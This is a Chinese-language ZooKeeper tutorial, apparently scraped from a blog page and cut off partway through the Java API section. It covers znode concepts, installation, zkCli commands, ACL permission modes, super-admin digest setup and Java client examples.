whitelist\n\n解决办法\n\n# 修改启动指令zkServer.sh\n# 注意找到这个信息\nelse\n\techo "JMX disabled by user request" >&2\n\tZOOMAIN="org.apache.zookeeper.server.quorum.QuorumPeerMain"\nfi\n# 下面添加如下信息\nZOOMAIN="-Dzookeeper.4lw.commands.whitelist=* ${ZOOMAIN}"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n每一个客户端的连接的watcher信息都会被收集起来，并且监控的路径都会被展示出来（代价高，消耗性能）\n\n[root@localhost bin]# echo wchc | nc 192.168.133.133 2180\n0x171be6c6faf0000\n        /node2\n        /node1\n0x171be6c6faf0001\n        /node3\n\n\n1\n2\n3\n4\n5\n6\n\n\n# wchp\n\n通过路径分组，列出所有的watch的session id 信息\n\n配置同wchc\n\n# mntr\n\n列出服务器的健康状态\n\n属性                              含义\nzk_version                      版本\nzk_avg_latency                  平均延时\nzk_max_latency                  最大延时\nzk_min_latency                  最小延时\nzk_packets_received             收包数\nzk_packets_sent                 发包数\nzk_num_alive_connections        连接数\nzk_outstanding_requests         堆积请求数\nzk_server_state                 leader/follower状态\nzk_znode_count                  znode数量\nzk_watch_count                  watch数量\nzk_ephemerals_count             l临时节点(znode)\nzk_approximate_data_size        数据大小\nzk_open_file_descriptor_count   打开的文件描述符数量\nzk_max_file_descriptor_count    最大文件描述符数量\n\n\n# ZooInspector图形化工具\n\n随便百度一个连接就好了\n\nhttps://issues.apache.org/jira/secure/attachment/12436620/ZooInspector.zip\n\n * 解压后进入目录ZooInspector\\build，运行zookeeper-dev-ZooInspector.jar\n * java -jar 运行，之后会弹出一个客户端\n * \n * \n * \n * 其它的不必多说，很容易懂(主要是功能也就这几个面板，主要还是直接zkCli.sh)\n\ntaokeeper检控工具\n\nbeta版，也就是公测版本(并不是开源的)，这里我自己都不用了，期待未来，文档我就照搬了\n\n基于zookeeper的监控管理工具taokeeper，由淘宝团队开发的zk管理中间件，安装强要求服务先配置nc和sshd\n\n 1. 下载数据库脚本——算了，我放弃了\n\n',normalizedContent:'官方文档上这么解释zookeeper，它是一个分布式服务框架，是apache hadoop的一个子项目，它主要是用来解决分布式应用中经常遇到的一些数据管理问题，如：统一命名服务、状态同步服务、集群管理、分布式应用配置项的管理等。\n\n简单来说zookeeper=文件系统+监听通知机制。\n\n\n\n * 简介/快速入门\n * 常用shell命令\n * zookeeper的acl权限控制\n * zookeeper的 javaapi\n * 事件监听机制\n * 配置中心案例\n * 分布式唯一id案例\n * 分布式锁案例\n * 集群搭建\n * curator介绍\n * 四字监控命令/配置属性\n * zooinspector图形化工具\n\n\n\n\n# 简介/快速入门\n\n官网：https://zookeeper.apache.org/\n\n> zookeeper is a centralized service for maintaining configuration information, naming, providing distributed synchronization, and providing group services. all of these kinds of services are used in some form or another by distributed applications. each time they are implemented there is a lot of work that goes into fixing the bugs and race conditions that are inevitable. because of the difficulty of implementing these kinds of services, applications initially usually skimp on them, which make them brittle in the presence of change and difficult to manage. even when done correctly, different implementations of these services lead to management complexity when the applications are deployed.\n\nzookeeper是一个集中的服务，用于维护配置信息、命名、提供分布式同步和提供组服务。所有这些类型的服务都以某种形式被分布式应用程序使用。每次它们被实现时，都会有大量的工作来修复不可避免的错误和竞争条件。由于实现这些服务的困难，应用程序最初通常会略过这些服务，这使得它们在出现更改时变得脆弱，并且难以管理。即使正确地执行了这些服务，在部署应用程序时，这些服务的不同实现也会导致管理复杂性\n\nzookeeper由雅虎研究院开发,是google chubby的开源实现,后来托管到 apache,于2010年11月正式成为apache的顶级项目\n\n大数据生态系统里由很多组件的命名都是某些动物或者昆虫，比如hadoop大象，hive就是蜂巢，zookeeper即管理员，顾名思义就算管理大数据生态系统各组件的管理员，如下所示：\n\n\n\n# 应用场景\n\nzookeepepr是一个经典的分布式数据一致性解决方案，致力于为分布式应用提供一个高性能、高可用,且具有严格顺序访问控制能力的分布式协调存储服务。\n\n * 维护配置信息\n * 分布式锁服务\n * 集群管理\n * 生成分布式唯一id\n\n 1. 维护配置信息\n    \n    * java编程经常会遇到配置项，比如数据库的url、 schema、user和 password等。通常这些配置项我们会放置在配置文件中，再将配置文件放置在服务器上当需要更改配置项时，需要去服务器上修改对应的配置文件。\n      \n      但是随着分布式系统的兴起,由于许多服务都需要使用到该配置文件,因此有必须保证该配置服务的高可用性(highavailability)和各台服务器上配置数据的一致性。\n      \n      通常会将配置文件部署在一个集群上，然而一个集群动辄上千台服务器，此时如果再一台台服务器逐个修改配置文件那将是非常繁琐且危险的的操作，因此就需要一种服务，能够高效快速且可靠地完成配置项的更改等操作，并能够保证各配置项在每台服务器上的数据一致性。\n      \n      zookeeper就可以提供这样一种服务，其使用zab这种一致性协议来保证一致性。现在有很多开源项目使用zookeeper来维护配置，如在 hbase中，客户端就是连接一个 zookeeper，获得必要的 hbase集群的配置信息，然后才可以进一步操作。还有在开源的消息队列 kafka中，也便用zookeeper来维护 brokers的信息。在 alibaba开源的soa框架dubbo中也广泛的使用zookeeper管理一些配置来实现服务治理。\n      \n      \n\n 2. 分布式锁服务\n    \n    * 一个集群是一个分布式系统，由多台服务器组成。为了提高并发度和可靠性，多台服务器上运行着同一种服务。当多个服务在运行时就需要协调各服务的进度，有时候需要保证当某个服务在进行某个操作时，其他的服务都不能进行该操作，即对该操作进行加锁，如果当前机器挂掉后，释放锁并 fail over到其他的机器继续执行该服务\n\n 3. 集群管理\n    \n    * 一个集群有时会因为各种软硬件故障或者网络故障，出现棊些服务器挂掉而被移除集群，而某些服务器加入到集群中的情况，zookeeper会将这些服务器加入/移出的情况通知给集群中的其他正常工作的服务器，以及时调整存储和计算等任务的分配和执行等。此外zookeeper还会对故障的服务器做出诊断并尝试修复。\n      \n      \n\n 4. 生产分布式唯一id\n    \n    * 在过去的单库单表型系统中，通常可以使用数据库字段自带的auto_ increment属性来自动为每条记录生成一个唯一的id。但是分库分表后，就无法在依靠数据库的auto_ increment属性来唯一标识一条记录了。此时我们就可以用zookeeper在分布式环境下生成全局唯一id。\n      \n      做法如下:每次要生成一个新id时，创建一个持久顺序节点，创建操作返回的节点序号，即为新id，然后把比自己节点小的删除即可\n\n# zookeeper的设计目标\n\nzookeeper致力于为分布式应用提供一个高性能、高可用，且具有严格顺序访问控制能力的分布式协调服务\n\n 1. 高性能\n    * zookeeper将全量数据存储在内存中，并直接服务于客户端的所有非事务请求，尤其用于以读为主的应用场景\n 2. 高可用\n    * zookeeper一般以集群的方式对外提供服务，一般3~5台机器就可以组成一个可用的 zookeeper集群了，每台机器都会在内存中维护当前的服务器状态，井且每台机器之间都相互保持着通信。只要集群中超过一半的机器都能够正常工作，那么整个集群就能够正常对外服务\n 3. 严格顺序访问\n    * 对于来自客户端的每个更新请求，zookeeper都会分配一个全局唯一的递增编号，这个编号反应了所有事务操作的先后顺序\n\n# 数据模型\n\nzookeeper的数据结点可以视为树状结构(或目录)，树中的各个结点被称为znode(即zookeeper node)，一个znode可以由多个子结点。zookeeper结点在结构上表现为树状；\n\n使用路径path来定位某个znode，比如/ns-1/itcast/mysqml/schemal1/table1，此处ns-1，itcast、mysql、schemal1、table1分别是根结点、2级结点、3级结点以及4级结点；其中ns-1是itcast的父结点，itcast是ns-1的子结点，itcast是mysql的父结点....以此类推\n\nznode，间距文件和目录两种特点，即像文件一样维护着数据、元信息、acl、时间戳等数据结构，又像目录一样可以作为路径标识的一部分\n\n\n\n那么如何描述一个znode呢？一个znode大体上分为3个部分：\n\n * 结点的数据：即znode data(结点path，结点data)的关系就像是java map中的 key value关系\n * 结点的子结点children\n * 结点的状态stat：用来描述当前结点的创建、修改记录，包括czxid、ctime等\n\n# 结点状态stat的属性\n\n在zookeeper shell中使用 get命令查看指定路径结点的data、stat信息\n\n\n\n属性说明：\n\n结点的各个属性如下。其中重要的概念是zxid(zookeeper transaction id)，zookeeper结点的每一次更改都具有唯一的zxid，如果zxid-1 小于zxid-2 ，则zxid-1 的更改发生在 zxid-2更改之前\n\nhttps://zookeeper.apache.org/doc/r3.4.14/zookeeperprogrammers.html#sc_zkdatamodel_znodes\n\n * czxid数据结点创建时的事务id——针对于zookeeper数据结点的管理：我们对结点数据的一些写操作都会导致zookeeper自动地为我们去开启一个事务，并且自动地去为每一个事务维护一个事务id\n * ctime数据结点创建时的时间\n * mzxid数据结点最后一次更新时的事务id\n * mtime数据结点最后一次更新时的时间\n * pzxid数据节点最后一次修改此znode子节点更改的zxid\n * cversion子结点的更改次数\n * dataversion结点数据的更改次数\n * aclversion结点的acl更改次数——类似linux的权限列表，维护的是当前结点的权限列表被修改的次数\n * ephemeralowner如果结点是临时结点，则表示创建该结点的会话的sessionid；如果是持久结点，该属性值为0\n * datalength数据内容的长度\n * numchildren数据结点当前的子结点个数\n\n结点类型\n\nzookeeper中的结点有两种，分别为临时结点和永久结点。结点的类型在创建时被确定，并且不能改变\n\n * 临时节点：\n   * 该节点的生命周期依赖于创建它们的会话。一旦会话( session）结束，临时节点将被自动删除，当然可以也可以手动删除。虽然每个临时的 znode都会绑定到一个客户端会话，但他们对所有的客户端还是可见的。另外，zookeeper的临时节点不允许拥有子节点\n * 持久化结点：\n   * 该结点的生命周期不依赖于会话，并且只有在客户端显示执行删除操作的时候，它们才能被删除\n\n# 单机安装\n\n测试系统环境centos7.3\n\nzookeeper:zookeeper-3.4.10.tar.gz\n\njdk:jdk-8u131-linux-x64.tar.gz\n\nhttp://archive.apache.org/dist/zookeeper/\n\n 1. 在centos中使用 root用户创建 zookeeper用户，用户名:zookeeper密码:zookeeper\n    \n    * useradd zookeeper\n      passwd zookeeper\n      su zookeeper\n      \n      \n      1\n      2\n      3\n      \n\n 2. zookeeper底层依赖于jdk，zookeeper用户登录后，根目录下先进行jdk 的安装，jdk使用 jdk-8u131-linux-x64.tar.gz\n    \n    * tar -zxf tar.gz\n      \n      \n      1\n      \n\n 3. 配置jdk 环境变量\n    \n    * vi /etc/profile\n      java_home=/home/zookeeper/jdk1.8.0_131\n      export java_home\n      \n      path=$java_home/bin:$path\n      export path\n      \n      souce /etc/profile\n      \n      \n      1\n      2\n      3\n      4\n      5\n      6\n      7\n      8\n      \n\n 4. 检测jdk安装\n    \n    * java -version // 如果反馈了java信息，则成功\n\n 5. zookeeper 上传解压\n    \n    * tar -zxf tar.gz\n\n 6. 为zookeeper准备配置文件\n    \n    * # 进入conf目录\n      cd /home/zookeeper/zookeeper-3.4.10/conf\n      # 复制配置文件\n      cp zoo_sampe.cfg zoo.cfg\n      # zookeeper 根目录下创建data目录\n      mkdir data\n      # vi 配置文件中的datadir\n      # 此路径用于存储zookeeper中数据的内存快照、及事务日志文件，虽然zookeeper是使用内存的，但是需要持久化一些数据来保证数据的安全，和redis一样\n      datadir=/home/zookeeper/zookeeper-3.4.10/data\n      \n      \n      1\n      2\n      3\n      4\n      5\n      6\n      7\n      8\n      9\n      \n\n 7. 启动zookeeper\n    \n    * # 进入zookeeper的bin目录\n      cd /home/zookeeper/zookeeper-3.4.10/bin\n      # 启动zookeeper\n      ./zkserver.sh start\n      \n      # 启动: zkserver.sh start\n      # 停止: zkserver.sh stop\n      # 查看状态：zkserver.sh status\n      \n      # 进入zookeeper 内部\n      ./zkcli.sh\n      \n      \n      1\n      2\n      3\n      4\n      5\n      6\n      7\n      8\n      9\n      10\n      11\n      \n\n\n# 常用shell命令\n\nzookeeper——getting started——https://zookeeper.apache.org/doc/r3.4.14/zookeeperstarted.html#sc_filemanagement\n\n# 查询\n\nget /hadoop 查看结点的数据和属性 stat /hadoop 查看结点的属性\n\n# 创建\n\n创建结点并写入数据：\n\ncreate [-s] [-e] path data # 其中 -s 为有序结点，-e 临时结点（默认是持久结点）\n\ncreate /hadoop "123456"  # 此时，如果quit退出后再./zkcient.sh 登入\n                         # 再用输入 get /hadoop 获取，结点依然存在(永久结点)\n\t\t\t\t       \ncreate -s /a "a"         # 创建一个持久化有序结点，创建的时候可以观察到返回的数据带上了一个id       \ncreate -s /b "b"         # 返回的值，id递增了\n\ncreate -s -e /aa "aa"    # 依然还会返回自增的id，quit后再进来，继续创建，id依然是往后推的\n\ncreate /aa/xx            # 继续创建结点，可以看到pzxid变化了\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n# 更新\n\n更新结点的命令是set，可以直接进行修改，如下：\n\nset path [version]\n\nset /hadoop "345"        # 修改结点值\n\nset /hadoop "hadoop-x" 1 # 也可以基于版本号进行更改，类似于乐观锁，当传入版本号(dataversion)\n                         # 和当前结点的数据版本号不一致时，zookeeper会拒绝本次修改\n\n\n1\n2\n3\n4\n\n\n# 删除\n\n删除结点的语法如下：\n\ndelete path [version] 和 set 方法相似，也可以传入版本号\n\ndelete /hadoop           # 删除结点\ndelete /hadoop 1         # 乐观锁机制，与set 方法一致\n\n\n1\n2\n\n\n要想删除某个结点及其所有后代结点，可以使用递归删除，命令为 rmr path\n\n查看结点列表\n\nls /hadoop               # 可以查看结点的列表\nls2 /hadoop              # 可以查看结点的列表以及目标结点的信息\n\nls /                     # 根节点\n\n\n1\n2\n3\n4\n\n\n监听器get path [watch] | stat path [watch]\n\n使用get path [watch] 注册的监听器能够在结点内容发生改变的时候，向客户端发出通知。需要注意的是zookeeper的触发器是一次性的(one-time trigger)，即触发一次后就会立即失效\n\nget /hadoop watch        # get 的时候添加监听器，当值改变的时候，监听器返回消息\nset /hadoop 45678        # 测试\n\n\n1\n2\n\n\nls\\ls2 path [watch]\n\n使用 ls path [watch] 或 ls2 path [watch]注册的监听器能够监听该结点下所有子节点的增加和删除操作\n\nls /hadoop watch         # 添加监听器\nset /hadoop/node "node"\n\n\n1\n2\n\n\n\n# zookeeper的acl权限控制\n\nhttps://zookeeper.apache.org/doc/r3.4.14/zookeeperprogrammers.html#sc_zookeeperaccesscontrol\n\nzookeeper类似文件系统，client可以创建结点、更新结点、删除结点，那么如何做到结点的权限控制呢？\n\nzookeeper的 access control list 访问控制列表可以做到这一点\n\nacl权限控制，使用scheme：id：permission来标识，主要涵盖3个方面：\n\nhttps://zookeeper.apache.org/doc/r3.4.14/zookeeperprogrammers.html#sc_builtinaclschemes\n\n * 权限模式(scheme)：授权的策略\n * 授权对象(id)：授权的对象\n * 权限(permission)：授予的权限\n\n其特性如下：\n\n * zookeeper的权限控制是基于每个znode结点的，需要对每个结点设置权限\n\n * 每个znode支持多种权限控制方案和多个权限\n\n * 子结点不会继承父结点的权限，客户端无权访问某结点，但可能可以访问它的子结点：\n   \n   例如setacl /test2 ip:192.168.133.133:crwda // 将结点权限设置为ip：192.168.133.133 的客户端可以对节点进行 增删改查和管理权限\n\n权限模式\n\n * 采用何种方式授权\n\n * \n\n * 方案       描述\n   world    只有一个用户：anyone，代表登录zookeeper所有人(默认)\n   ip       对客户端使用ip地址认证\n   auth     使用已添加认证的用户认证\n   digest   使用"用户名：密码"方式认证\n\n授权对象\n\n * 给谁授予权限\n * 授权对象id是指，权限赋予的实体，例如：ip地址或用户\n\n授权的权限\n\n * 授予什么权限\n\n * create、delete、read、writer、admin也就是 增、删、查、改、管理权限，这5种权限简写为 c d r w a，注意： 这五种权限中，有的权限并不是对结点自身操作的例如：delete是指对子结点的删除权限\n   \n   可以试图删除父结点，但是子结点必须删除干净，所以delete的权限也是很有用的\n\n * \n\n * 权限       acl简写   描述\n   create   c       可以创建子结点\n   delete   d       可以删除子结点(仅下一级结点)\n   read     r       可以读取结点数据以及显示子结点列表\n   write    w       可以设置结点数据\n   admin    a       可以设置结点访问控制权限列表\n\n授权的相关命令\n\n * \n\n * 命令        使用方式      描述\n   getacl    getacl    读取acl权限\n   setacl    setacl    设置acl权限\n   addauth   addauth   添加认证用户\n\n# 案例/远程登录\n\n./zkserver.sh -server 192.168.133.133 可以远程登录\n\nworld权限模式\n\n * getacl /node // 读取权限信息\n * setacl /node world:anyone:drwa // 设置权限(禁用创建子结点的权限)\n\nip模式\n\n./zkserver.sh -server 192.168.133.133 可以远程登录\n\n * setacl /hadoop ip:192.168.133.133:drwa\n * 如果在两台不同的虚拟机中，另一台用远程连接的模式，进行上面这条命令，那么只会有一台被授权\n * 需要两台虚拟机一起授权的话需要用逗号将授权列表隔开：setacl /hadoop ip:192.168.133.133:cdrwa,ip:192.168.133.132:cdrwa\n\nauth认证用户模式\n\naddauth digest <user>:<password>\n\nsetacl <path> auth:<user>:<acl>\n\n * create /hadoop "hadoop"           # 初始化测试用的结点\n   addauth digest itcast:123456      # 添加认证用户\n   setacl /hadoop auth:itcast:cdrwa  # 设置认证用户\n   quit                              # 退出后再./zkcli.sh 进入\n   get /hadoop                       # 这个时候就没有权限了，需要再次认证\n   addauth digest itcast:123456      # 认证，密码错了的话 zookeeper 不会报错，但是不能认证\n   get /hadoop\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   \n\ndigest授权模式\n\nsetacl <path> digest:<user>:<password>:<acl>\n\n * 这里的密码是经过sha1以及base64处理的密文，在shell 中可以通过以下命令计算：\n   \n   * echo -n <user>:<password> | openssl dgst -binary -sha1 | openssl base64\n     \n     \n     1\n     \n   \n   * # 计算密码\n     echo -n itcast:12345 | openssl dgst -binary -sha1 | openssl base64\n     # 获取密码，设置权限列表\n     setacl /hadoop digest:itcast:qufshxjjituw/93uhfxfvglvryy=:cdrwa\n     # 现在想要get /hadoop 需要登录了\n     addauth digest itcast:12345\n     get /hadoop\n     \n     \n     1\n     2\n     3\n     4\n     5\n     6\n     7\n     \n\n多种授权模式\n\n仅需逗号隔开\n\n *  setacl /hadoop ip:192.168.133.132:cdrwa,auth:hadoop:cdrwa,digest:itcast:673ofzhue8jefmcu0l64qi8e5ek=:cdrwa\n   \n   \n   1\n   \n\n# acl 超级管理员\n\n * zookeeper的权限管理模式有一种叫做super，该模式提供一个超管，可以方便的访问任何权限的节点\n   \n   假设这个超管是supper:admin，需要为超管生产密码的密文\n   \n   echo -n super:admin | openssl dgst -binary -sha1 | openssl base64\n   \n   \n   1\n   \n\n * 那么打开zookeeper目录下/bin/zkserver.sh服务器脚本文件，找到如下一行：\n   \n    /nohup # 快速查找，可以看到如下\n    nohup "$java" "-dzookeeper.log.dir=${zoo_log_dir}" "-dzookeeper.root.logger=${zoo_log4j_prop}"\n   \n   \n   1\n   2\n   \n\n * 这个就算脚本中启动zookeeper的命令，默认只有以上两个配置项，我们需要添加一个超管的配置项\n   \n   "-dzookeeper.digestauthenticationprovider.superdigest=super:xqjmxlmihgwaqbvst5y6rkb6hqs="\n   \n   \n   1\n   \n\n * 修改后命令变成如下\n   \n   nohup "$java" "-dzookeeper.log.dir=${zoo_log_dir}" "-dzookeeper.root.logger=${zoo_log4j_prop}" "-dzookeeper.digestauthenticationprovider.superdigest=super:xqjmxlmihgwaqbvst5y6rkb6hqs="\n   \n   \n   1\n   \n\n * # 重起后，现在随便对任意节点添加权限限制\n   setacl /hadoop ip:192.168.1.1:cdrwa # 这个ip并非本机\n   # 现在当前用户没有权限了\n   getacl /hadoop\n   # 登录超管\n   addauth digest super:admin\n   # 强行操作节点\n   get /hadoop\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   \n\n\n# zookeeper的 javaapi\n\n<dependency>\n            <groupid>com.101tec</groupid>\n            <artifactid>zkclient</artifactid>\n            <exclusions>\n                <exclusion>\n                    <artifactid>zookeeper</artifactid>\n                    <groupid>org.apache.zookeeper</groupid>\n                </exclusion>\n                <exclusion>\n                    <artifactid>log4j</artifactid>\n                    <groupid>log4j</groupid>\n                </exclusion>\n                <exclusion>\n                    <artifactid>slf4j-log4j12</artifactid>\n                    <groupid>org.slf4j</groupid>\n                </exclusion>\n                <exclusion>\n                    <artifactid>slf4j-api</artifactid>\n                    <groupid>org.slf4j</groupid>\n                </exclusion>\n            </exclusions>\n            <version>0.9</version>\n        </dependency>\n        <dependency>\n            <artifactid>zookeeper</artifactid>\n            <exclusions>\n                <exclusion>\n                    <artifactid>log4j</artifactid>\n                    <groupid>log4j</groupid>\n                </exclusion>\n                <exclusion>\n                    <artifactid>slf4j-log4j12</artifactid>\n                    <groupid>org.slf4j</groupid>\n                </exclusion>\n            </exclusions>\n            <groupid>org.apache.zookeeper</groupid>\n            <version>3.4.10</version>\n        </dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n\n\nzonde是 zookeeper集合的核心组件，zookeeper api 提供了一小组使用 zookeeper集群来操作znode的所有细节\n\n客户端应该遵循以下步骤，与zookeeper服务器进行清晰和干净的交互\n\n * 连接到zookeeper服务器。zookeeper服务器为客户端分配会话id\n * 定期向服务器发送心跳。否则，zookeeper服务器将过期会话id，客户端需要重新连接\n * 只要会话id处于活动状态，就可以获取/设置znode\n * 所有任务完成后，断开与zookeeper服务器连接，如果客户端长时间不活动，则zookeeper服务器将自动断开客户端\n\n# 连接到zookeeper\n\n这部分，官网的解释十分稀少https://zookeeper.apache.org/doc/r3.4.14/zookeeperstarted.html#sc_connectingtozookeeper\n\n[zkshell: 0] help\nzookeeper host:port cmd args\n    get path [watch]\n    ls path [watch]\n    set path data [version]\n    delquota [-n|-b] path\n    quit\n    printwatches on|off\n    create path data acl\n    stat path [watch]\n    listquota path\n    history\n    setacl path acl\n    getacl path\n    sync path\n    redo cmdno\n    addauth scheme auth\n    delete path [version]\n    deleteall path\n    setquota -n|-b val path\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\nzookeeper(string connectionstring, int sessiontimeout, watcher watcher)\n\n\n1\n\n * connectionstring - zookeeper主机\n * sessiontimeout- 会话超时\n * watcher - 实现"监听器" 对象。zookeeper集合通过监视器对象返回连接状态\n\npublic static void main(string[] args) throws ioexception, interruptedexception {\n        countdownlatch countdownlatch = new countdownlatch(1);\n\n        zookeeper zookeeper = new zookeeper("192.168.133.133:2181", 5000, (watchedevent x) -> {\n            if (x.getstate() == watcher.event.keeperstate.syncconnected) {\n                system.out.println("连接成功");\n                countdownlatch.countdown();\n            }\n        });\n        countdownlatch.await();\n        system.out.println(zookeeper.getsessionid());\n        zookeeper.close();\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# 新增节点\n\n * // 同步\n   create(string path, byte[] data, list<acl> acl, createmode createmode)\n   // 异步\n   create(string path, byte[] data, list<acl> acl, createmode createmode,\n         asyncallback.stringcallback callback, object ctx)\n   \n   \n   1\n   2\n   3\n   4\n   5\n   \n * \n\n * 参数           解释\n   path         znode路径\n   data         数据\n   acl          要创建的节点的访问控制列表。zookeeper api提供了一个静态接口 zoodefs.ids\n                来获取一些基本的acl列表。例如，zoodefs.ids.open_acl_unsafe返回打开znode的acl列表\n   createmode   节点的类型，这是一个枚举\n   callback     异步回调接口\n   ctx          传递上下文参数\n\n示例：\n\n * // 枚举的方式\n       public static void createtest1() throws exception{\n           string str = "node";\n           string s = zookeeper.create("/node", str.getbytes(),\n                   zoodefs.ids.read_acl_unsafe, createmode.persistent);\n           system.out.println(s);\n       }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   \n\n * // 自定义的方式\n       public static void createtest2() throws exception{\n           arraylist<acl> acls = new arraylist<>();\n           id id = new id("ip","192.168.133.133");\n           acls.add(new acl(zoodefs.perms.all,id));\n           zookeeper.create("/create/node4","node4".getbytes(),acls,createmode.persistent);\n       }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   \n\n * // auth\n       public static void createtest3() throws  exception{\n           zookeeper.addauthinfo("digest","itcast:12345".getbytes());\n           zookeeper.create("/node5","node5".getbytes(),\n                   zoodefs.ids.creator_all_acl,createmode.persistent);\n       }\n   // 自定义的方式\n       public static void createtest3() throws  exception{\n   //        zookeeper.addauthinfo("digest","itcast:12345".getbytes());\n   //        zookeeper.create("/node5","node5".getbytes(),\n   //                zoodefs.ids.creator_all_acl,createmode.persistent);\n           zookeeper.addauthinfo("digest","itcast:12345".getbytes());\n           list<acl> acls = new arraylist<>();\n           id id = new id("auth","itcast");\n           acls.add(new acl(zoodefs.perms.read,id));\n           zookeeper.create("/create/node6","node6".getbytes(),\n                   acls,createmode.persistent);\n       }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   \n\n * // digest \n   public static void createtest3() throws  exception{\n       list<acl> acls = new arraylist<>();\n       id id = new id("digest","itcast:qufshxjjituw/93uhfxfvglvryy=");\n       acls.add(new acl(zoodefs.perms.read,id));\n       zookeeper.create("/create/node7","node7".getbytes(), \t\n                        acls,createmode.persistent);\n   }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   \n\n * // 异步\n       public static void createtest4() throws  exception{\n           zookeeper.create("/node12", "node12".getbytes(), zoodefs.ids.open_acl_unsafe, createmode.persistent, new asynccallback.stringcallback(){\n               /**\n                * @param rc 状态，0 则为成功，以下的所有示例都是如此\n                * @param path 路径\n                * @param ctx 上下文参数\n                * @param name 路径\n                */\n               public void processresult(int rc, string path, object ctx, string name){\n                   system.out.println(rc + " " + path + " " + name +  " " + ctx);\n               }\n           }, "i am context");\n           timeunit.seconds.sleep(1);\n           system.out.println("结束");\n       }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   \n\n# 修改节点\n\n同样也有两种修改方式(异步和同步)\n\n * // 同步\n   setdata(string path, byte[] data, int version)\n   // 异步\n   setdata(string path, byte[] data, int version, statcallback callback, object ctx)\n   \n   \n   1\n   2\n   3\n   4\n   \n * \n\n * 参数         解释\n   path       节点路径\n   data       数据\n   version    数据的版本号， -1代表不使用版本号，乐观锁机制\n   callback   异步回调 asynccallback.statcallback，和之前的回调方法参数不同，这个可以获取节点状态\n   ctx        传递上下文参数\n\n *     public static void setdata1() throws exception{\n       \t// arg1:节点的路径\n           // arg2:修改的数据\n           // arg3:数据的版本号 -1 代表版本号不参与更新\n           stat stat = zookeeper.setdata("/hadoop","hadoop-1".getbytes(),-1);\n       }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   \n\n *     public static void setdata2() throws exception{\n           zookeeper.setdata("/hadoop", "hadoop-1".getbytes(), 3 ,new asynccallback.statcallback(){\n               @override\n               public void processresult(int rc, string path, object ctx, stat stat) {\n                   // 讲道理，要判空\n                   system.out.println(rc + " " + path + " " + stat.getversion() +  " " + ctx);\n               }\n           }, "i am context");\n       }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   \n\n# 删除节点\n\n异步、同步\n\n * // 同步\n   delete(string path, int version)\n   // 异步\n   delete(string path, int version, asynccallback.voidcallback callback, object ctx)\n   \n   \n   1\n   2\n   3\n   4\n   \n * \n\n * 参数         解释\n   path       节点路径\n   version    版本\n   callback   数据的版本号， -1代表不使用版本号，乐观锁机制\n   ctx        传递上下文参数\n\n *     public static void deletedata1() throws exception {\n           zookeeper.delete("/hadoop", 1);\n       }\n   \n       public static void deletedata2() throws exception {\n           zookeeper.delete("/hadoop", 1, new asynccallback.voidcallback() {\n               @override\n               public void processresult(int rc, string path, object ctx) {\n                   system.out.println(rc + " " + path + " " + ctx);\n               }\n           }, "i am context");\n           timeunit.seconds.sleep(1);\n       }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   \n\n# 查看节点\n\n同步、异步\n\n * // 同步\n   getdata(string path, boolean watch, stat stat)\n   getdata(string path, watcher watcher, stat stat)\n   // 异步\n   getdata(string path, boolean watch, datacallback callback, object ctx)\n   getdata(string path, watcher watcher, datacallback callback, object ctx)\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   \n * \n\n * 参数         解释\n   path       节点路径\n   boolean    是否使用连接对象中注册的监听器\n   stat       元数据\n   callback   异步回调接口，可以获得状态和数据\n   ctx        传递上下文参数\n\n *     public static void getdata1() throws exception {\n           stat stat = new stat();\n           byte[] data = zookeeper.getdata("/hadoop", false, stat);\n           system.out.println(new string(data));\n           // 判空\n           system.out.println(stat.getctime());\n       }\n   \n       public static void getdata2() throws exception {\n           zookeeper.getdata("/hadoop", false, new asynccallback.datacallback() {\n               @override\n               public void processresult(int rc, string path, object ctx, byte[] bytes, stat stat) {\n                   // 判空\n                   system.out.println(rc + " " + path\n                                      + " " + ctx + " " + new string(bytes) + " " + \n                                      stat.getczxid());\n               }\n           }, "i am context");\n           timeunit.seconds.sleep(3);\n       }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   20\n   \n\n# 查看子节点\n\n同步、异步\n\n * // 同步\n   getchildren(string path, boolean watch)\n   getchildren(string path, watcher watcher)\n   getchildren(string path, boolean watch, stat stat)    \n   getchildren(string path, watcher watcher, stat stat)\n   // 异步\n   getchildren(string path, boolean watch, childrencallback callback, object ctx)    \n   getchildren(string path, watcher watcher, childrencallback callback, object ctx)\n   getchildren(string path, watcher watcher, children2callback callback, object ctx)    \n   getchildren(string path, boolean watch, children2callback callback, object ctx)\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   \n * \n\n * 参数         解释\n   path       节点路径\n   boolean    \n   callback   异步回调，可以获取节点列表\n   ctx        传递上下文参数\n\n *     public static void getchildren_1() throws exception{\n           list<string> hadoop = zookeeper.getchildren("/hadoop", false);\n           hadoop.foreach(system.out::println);\n       }\n   \n       public static void getchildren_2() throws exception {\n           zookeeper.getchildren("/hadoop", false, new 